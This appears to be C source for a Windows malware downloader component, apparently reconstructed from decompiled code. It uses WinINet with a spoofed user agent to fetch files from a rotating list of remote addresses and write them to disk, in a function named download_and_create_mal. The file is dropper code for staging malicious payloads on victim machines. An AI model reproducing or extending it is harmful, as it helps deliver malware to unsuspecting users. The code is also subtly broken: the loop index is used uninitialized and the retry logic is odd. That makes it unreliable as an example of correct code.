//
// Created by BLUE_gigi on 01/06/2023.
//

#include "downloader.h"
#include<windows.h>
#include <wininet.h>
#include <stdio.h>

int verbose=1;
int download_files(char* address,char* path)
{
    LPVOID hInternet;
    LPVOID hFile;
    FILE *localFile;

    char lpzStr[0x1000];
    DWORD bytesRead=0;

    hInternet = (LPVOID)InternetOpenA("Mozilla/4.1337",INTERNET_OPEN_TYPE_PRECONFIG,0,0,0);
    if (hInternet == (LPVOID)0x0) {
        if(verbose){
            printf("cannot open connectio\n");
        }
        return 0;
    }
    hFile = (LPVOID)InternetOpenUrlA(hInternet,address,0,0,INTERNET_FLAG_RESYNCHRONIZE,INTERNET_NO_CALLBACK);
    if (hFile != (LPVOID)0x0) {

        localFile = fopen((char *)path,"wb");
        if (localFile != (FILE *)0x0) {

            int passed=1;
            while (passed) {
                passed=InternetReadFile(hFile,&lpzStr,0x1000,&bytesRead);
                fwrite(&lpzStr,bytesRead,1,localFile);
                if(!bytesRead)
                    break;
            }
            fclose(localFile);
            if(verbose){
                printf("File downloaded\n");
            }
            InternetCloseHandle(hFile);
            return passed;
        }
        if(verbose){
            printf("cannot open local file\n");
        }

        return 0;
    }
    if(verbose){
        printf("cannot open remote file\n");
    }

    return 0;
}
int download_and_create_mal(char** address_list, char* path)

{
    int success;
    int index;
    int max_number;

    // This is the loop in which the effective download happens
    max_number = 0;
    do {
        if(verbose){
            printf("try %d\n",index);
        }

        index = index + 1;
        max_number = max_number + 1;
        if (3 < (int)index) {
            index = 0;
        }
        if (4 < max_number) break;

        success = download_files(address_list[index],path);
    } while ((char)success == '\0');

    return success;
}
